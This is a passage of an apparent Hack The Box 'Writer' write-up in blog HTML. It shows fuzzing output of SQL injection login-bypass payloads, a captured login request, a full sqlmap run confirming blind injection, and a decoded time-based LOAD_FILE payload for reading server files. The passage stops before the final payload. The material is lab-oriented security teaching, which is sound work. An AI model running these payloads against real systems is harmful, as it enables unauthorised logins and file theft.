class="line"><span class="string">[2K    * PASS: admin&#x27;</span>-- 2</span><br><span class="line"></span><br><span class="line">[2K    * UNAME: admin<span class="string">&#x27;-- 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>||<span class="string">&#x27;2&#x27;</span>||<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>||<span class="string">&#x27;2&#x27;</span>||<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>||2-- 2</span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;||2-- 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>||2<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;||2#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>||2||<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>||2||<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>||2=2-- 2</span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;||2=2-- 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>||2=2<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;||2=2#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>||<span class="string">&#x27;2&#x27;</span>=<span class="string">&#x27;2&#x27;</span>||<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>||<span class="string">&#x27;2&#x27;</span>=<span class="string">&#x27;2&#x27;</span>||<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>||(2)LiKE(2)||<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>||(2)LiKE(2)||<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>||(2)LiKE(2)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * UNAME: <span class="string">&#x27;||(2)LiKE(2)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>||2=2||<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>||2=2||<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>||<span class="string">&#x27;2&#x27;</span>LiKE<span class="string">&#x27;2&#x27;</span>||<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>||<span class="string">&#x27;2&#x27;</span>LiKE<span class="string">&#x27;2&#x27;</span>||<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>||<span class="string">&#x27;2&#x27;</span>LiKE<span class="string">&#x27;2&#x27;</span>-- 2</span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;||&#x27;</span>2<span class="string">&#x27;LiKE&#x27;</span>2<span class="string">&#x27;-- 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>||<span class="string">&#x27;2&#x27;</span>LiKE<span class="string">&#x27;2&#x27;</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;||&#x27;</span>2<span class="string">&#x27;LiKE&#x27;</span>2<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>||<span class="literal">true</span>||<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>||<span class="literal">true</span>||<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>||(2)LiKE(2)-- 2</span><br><span class="line"></span><br><span class="line">[2K    * UNAME: <span class="string">&#x27;||(2)LiKE(2)-- 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>||<span class="literal">true</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;||true#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>||<span class="literal">true</span>-- 2</span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;||true-- 2</span></span><br></pre></td></tr></table></figure>

<p>Looks like we have few payload working try any payload and you will be logged in as admin.</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2050.jpg"></p>
</li>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2051.jpg"></p>
</li>
</ul>
<p>so let’s enumerate this more while running sqlmap in background.</p>
<h3 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h3><p>So I intercepted the post request using the burpsuite and save it to a local file.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Writer$ <span class="built_in">cat</span> r.txt </span><br><span class="line">POST /administrative HTTP/1.1</span><br><span class="line">Host: writer.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 26</span><br><span class="line">Origin: http://writer.htb</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://writer.htb/administrative</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"><span class="built_in">uname</span>=admin&amp;password=admin</span><br></pre></td></tr></table></figure>

<p>After that I Ran sqlmap on that login form.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Writer$ sqlmap -r r.txt --dbs --batch --level 5 --risk 3</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.4.10<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [(]     | .<span class="string">&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [,]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="keyword">for</span> any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 02:25:59 /2021-08-01/</span><br><span class="line"></span><br><span class="line">[02:25:59] [INFO] parsing HTTP request from <span class="string">&#x27;r.txt&#x27;</span></span><br><span class="line">[02:26:01] [INFO] testing connection to the target URL</span><br><span class="line">[02:26:02] [INFO] testing <span class="keyword">if</span> the target URL content is stable</span><br><span class="line">[02:26:02] [INFO] target URL content is stable</span><br><span class="line">[02:26:02] [INFO] testing <span class="keyword">if</span> POST parameter <span class="string">&#x27;uname&#x27;</span> is dynamic</span><br><span class="line">[02:26:02] [WARNING] POST parameter <span class="string">&#x27;uname&#x27;</span> does not appear to be dynamic</span><br><span class="line">[02:26:03] [WARNING] heuristic (basic) <span class="built_in">test</span> shows that POST parameter <span class="string">&#x27;uname&#x27;</span> might not be injectable</span><br><span class="line">[02:26:03] [INFO] testing <span class="keyword">for</span> SQL injection on POST parameter <span class="string">&#x27;uname&#x27;</span></span><br><span class="line">[02:26:04] [INFO] testing <span class="string">&#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span></span><br><span class="line">[02:26:22] [INFO] testing <span class="string">&#x27;OR boolean-based blind - WHERE or HAVING clause&#x27;</span></span><br><span class="line">got a refresh intent (redirect like response common to login pages) to <span class="string">&#x27;/dashboard&#x27;</span>. Do you want to apply it from now on? [Y/n] Y</span><br><span class="line">got a 302 redirect to <span class="string">&#x27;http://writer.htb/&#x27;</span>. Do you want to follow? [Y/n] Y</span><br><span class="line">[02:26:26] [INFO] POST parameter <span class="string">&#x27;uname&#x27;</span> appears to be <span class="string">&#x27;OR boolean-based blind - WHERE or HAVING clause&#x27;</span> injectable (with --code=302)</span><br><span class="line">[02:26:28] [INFO] heuristic (extended) <span class="built_in">test</span> shows that the back-end DBMS could be <span class="string">&#x27;MySQL&#x27;</span> </span><br><span class="line">it looks like the back-end DBMS is <span class="string">&#x27;MySQL&#x27;</span>. Do you want to skip <span class="built_in">test</span> payloads specific <span class="keyword">for</span> other DBMSes? [Y/n] Y</span><br><span class="line">[02:26:28] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)&#x27;</span></span><br><span class="line">[02:26:28] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)&#x27;</span></span><br><span class="line">[02:26:30] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)&#x27;</span></span><br><span class="line">[02:26:30] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)&#x27;</span></span><br><span class="line">[02:26:31] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)&#x27;</span></span><br><span class="line">[02:26:31] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)&#x27;</span></span><br><span class="line">[02:26:31] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)&#x27;</span></span><br><span class="line">[02:26:32] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)&#x27;</span></span><br><span class="line">[02:26:32] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27;</span></span><br><span class="line">[02:26:33] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27;</span></span><br><span class="line">[02:26:34] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#x27;</span></span><br><span class="line">[02:26:34] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#x27;</span></span><br><span class="line">[02:26:35] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)&#x27;</span></span><br><span class="line">[02:26:35] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)&#x27;</span></span><br><span class="line">[02:26:36] [INFO] testing <span class="string">&#x27;MySQL &gt;= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27;</span></span><br><span class="line">[02:26:37] [INFO] testing <span class="string">&#x27;MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)&#x27;</span></span><br><span class="line">[02:26:40] [INFO] testing <span class="string">&#x27;MySQL OR error-based - WHERE or HAVING clause (FLOOR)&#x27;</span></span><br><span class="line">[02:26:40] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)&#x27;</span></span><br><span class="line">[02:26:41] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)&#x27;</span></span><br><span class="line">[02:26:41] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.5 error-based - Parameter replace (EXP)&#x27;</span></span><br><span class="line">[02:26:41] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.6 error-based - Parameter replace (GTID_SUBSET)&#x27;</span></span><br><span class="line">[02:26:41] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.7.8 error-based - Parameter replace (JSON_KEYS)&#x27;</span></span><br><span class="line">[02:26:41] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)&#x27;</span></span><br><span class="line">[02:26:41] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)&#x27;</span></span><br><span class="line">[02:26:41] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.1 error-based - Parameter replace (EXTRACTVALUE)&#x27;</span></span><br><span class="line">[02:26:41] [INFO] testing <span class="string">&#x27;Generic inline queries&#x27;</span></span><br><span class="line">[02:26:41] [INFO] testing <span class="string">&#x27;MySQL inline queries&#x27;</span></span><br><span class="line">[02:26:41] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.0.12 stacked queries (comment)&#x27;</span></span><br><span class="line">[02:26:43] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.0.12 stacked queries&#x27;</span></span><br><span class="line">[02:26:44] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.0.12 stacked queries (query SLEEP - comment)&#x27;</span></span><br><span class="line">[02:26:47] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.0.12 stacked queries (query SLEEP)&#x27;</span></span><br><span class="line">[02:26:49] [INFO] testing <span class="string">&#x27;MySQL &lt; 5.0.12 stacked queries (heavy query - comment)&#x27;</span></span><br><span class="line">[02:26:59] [INFO] testing <span class="string">&#x27;MySQL &lt; 5.0.12 stacked queries (heavy query)&#x27;</span></span><br><span class="line">[02:27:01] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span></span><br><span class="line">[02:27:13] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.0.12 OR time-based blind (query SLEEP)&#x27;</span></span><br><span class="line">[02:27:48] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.0.12 AND time-based blind (SLEEP)&#x27;</span></span><br><span class="line">[02:27:59] [INFO] POST parameter <span class="string">&#x27;uname&#x27;</span> appears to be <span class="string">&#x27;MySQL &gt;= 5.0.12 AND time-based blind (SLEEP)&#x27;</span> injectable </span><br><span class="line">[02:27:59] [INFO] testing <span class="string">&#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;</span></span><br><span class="line">[02:27:59] [INFO] automatically extending ranges <span class="keyword">for</span> UNION query injection technique tests as there is at least one other (potential) technique found</span><br><span class="line">[02:28:18] [INFO] target URL appears to be UNION injectable with 6 columns</span><br><span class="line">injection not exploitable with NULL values. Do you want to try with a random <span class="built_in">integer</span> value <span class="keyword">for</span> option <span class="string">&#x27;--union-char&#x27;</span>? [Y/n] Y</span><br><span class="line">[02:29:44] [WARNING] <span class="keyword">if</span> UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. <span class="string">&#x27;--dbms=mysql&#x27;</span>) </span><br><span class="line">[02:29:44] [INFO] testing <span class="string">&#x27;Generic UNION query (15) - 21 to 40 columns&#x27;</span></span><br><span class="line">[02:29:54] [INFO] testing <span class="string">&#x27;Generic UNION query (15) - 41 to 60 columns&#x27;</span></span><br><span class="line">[02:30:03] [INFO] testing <span class="string">&#x27;Generic UNION query (15) - 61 to 80 columns&#x27;</span></span><br><span class="line">[02:30:10] [INFO] testing <span class="string">&#x27;Generic UNION query (15) - 81 to 100 columns&#x27;</span></span><br><span class="line">[02:30:18] [INFO] testing <span class="string">&#x27;MySQL UNION query (15) - 1 to 20 columns&#x27;</span></span><br><span class="line">[02:31:01] [INFO] testing <span class="string">&#x27;MySQL UNION query (15) - 21 to 40 columns&#x27;</span></span><br><span class="line">[02:31:14] [INFO] testing <span class="string">&#x27;MySQL UNION query (15) - 41 to 60 columns&#x27;</span></span><br><span class="line">[02:31:26] [INFO] testing <span class="string">&#x27;MySQL UNION query (15) - 61 to 80 columns&#x27;</span></span><br><span class="line">[02:31:32] [INFO] testing <span class="string">&#x27;MySQL UNION query (15) - 81 to 100 columns&#x27;</span></span><br><span class="line">[02:31:41] [WARNING] <span class="keyword">in</span> OR boolean-based injection cases, please consider usage of switch <span class="string">&#x27;--drop-set-cookie&#x27;</span> <span class="keyword">if</span> you experience any problems during data retrieval</span><br><span class="line">[02:31:41] [INFO] checking <span class="keyword">if</span> the injection point on POST parameter <span class="string">&#x27;uname&#x27;</span> is a <span class="literal">false</span> positive</span><br><span class="line">POST parameter <span class="string">&#x27;uname&#x27;</span> is vulnerable. Do you want to keep testing the others (<span class="keyword">if</span> any)? [y/N] N</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 399 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: <span class="built_in">uname</span> (POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: <span class="built_in">uname</span>=-5059<span class="string">&#x27; OR 5521=5521-- GmkC&amp;password=admin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (SLEEP)</span></span><br><span class="line"><span class="string">    Payload: uname=admin&#x27;</span> AND SLEEP(5)-- RZDj&amp;password=admin</span><br><span class="line">---</span><br><span class="line">[02:32:13] [INFO] the back-end DBMS is MySQL</span><br><span class="line">[02:32:14] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12 (TiDB fork)</span><br><span class="line">[02:32:15] [INFO] fetching database names</span><br><span class="line">[02:32:15] [INFO] fetching number of databases</span><br><span class="line">[02:32:15] [WARNING] running <span class="keyword">in</span> a single-thread mode. Please consider usage of option <span class="string">&#x27;--threads&#x27;</span> <span class="keyword">for</span> faster data retrieval</span><br><span class="line"></span><br><span class="line">[02:32:15] [INFO] retrieved: </span><br><span class="line"></span><br><span class="line">[02:32:19] [INFO] retrieved: [02:32:19] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions </span><br><span class="line"></span><br><span class="line">[02:32:21] [WARNING] <span class="keyword">in</span> <span class="keyword">case</span> of continuous data retrieval problems you are advised to try a switch <span class="string">&#x27;--no-cast&#x27;</span> or switch <span class="string">&#x27;--hex&#x27;</span></span><br><span class="line">[02:32:21] [ERROR] unable to retrieve the number of databases</span><br><span class="line">[02:32:21] [INFO] falling back to current database</span><br><span class="line">[02:32:21] [INFO] fetching current database</span><br><span class="line"></span><br><span class="line">[02:32:21] [INFO] retrieved: </span><br><span class="line"></span><br><span class="line">[02:34:18] [INFO] retrieved: </span><br><span class="line">[02:34:20] [CRITICAL] unable to retrieve the database names</span><br><span class="line">[02:34:20] [INFO] fetched data logged to text files under <span class="string">&#x27;/home/kali/.local/share/sqlmap/output/writer.htb&#x27;</span></span><br><span class="line">[02:34:20] [WARNING] your sqlmap version is outdated</span><br><span class="line"></span><br><span class="line">[*] ending @ 02:34:20 /2021-08-01/</span><br></pre></td></tr></table></figure>

<p>Looks like we have SQL Injection but we cannot retrive database names which is annoying so let’s try and read some files.<br>So we know that the it’s time based blind sql injection so it will take up lot of time to get long file so I decided to check which payload sqlmap uses for the injection and play around with that payload manually to read some files.</p>
<p>I used wireshark to get the exact payload that sqlmap used I used wireshark to capture traffic on my tun0 interface which looked like.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2052.jpg"></li>
</ul>
<p>Then I picked up a POST request to &#x2F;administrative endpoint that has a payload and followed it’s TCP stream.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2053.jpg"></li>
</ul>
<p>and we have the payload.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNAME%27%20AND%20%28SELECT%201088%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28IFNULL%28CAST%28HEX%28LOAD_FILE%280x2f6574632f686f73746e616d65%29%29%20AS%20NCHAR%29%2C0x20%29%29%2C6%2C1%29%29%3E57%2C0%2C1%29%29%29%29%29ZDPK%29%20AND%20%27GIYW%27%3D%27GIYW</span><br></pre></td></tr></table></figure>

<p>URL Decoding the payload will make it more redable.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNAME<span class="string">&#x27; AND (SELECT 1088 FROM (SELECT(SLEEP(1-(IF(ORD(MID((IFNULL(CAST(HEX(LOAD_FILE(0x2f6574632f686f73746e616d65)) AS NCHAR),0x20)),6,1))&gt;57,0,1)))))ZDPK) AND &#x27;</span>GIYW<span class="string">&#x27;=&#x27;</span>GIYW</span><br></pre></td></tr></table></figure>

<p>and there is still few hex numbers in the there so let’s get them sorted also.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Writer$ python3</span><br><span class="line">Python 3.9.2 (default, Feb 28 2021, 17:03:44) </span><br><span class="line">[GCC 10.2.1 20210110] on linux</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(bytes.fromhex(<span class="string">&#x27;2f6574632f686f73746e616d65&#x27;</span>))</span><br><span class="line">b<span class="string">&#x27;/etc/hostname&#x27;</span></span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(bytes.fromhex(<span class="string">&#x27;20&#x27;</span>))</span><br><span class="line">b<span class="string">&#x27; &#x27;</span></span><br></pre></td></tr></table></figure>

<p>So the final payload looks like as follow.</p>
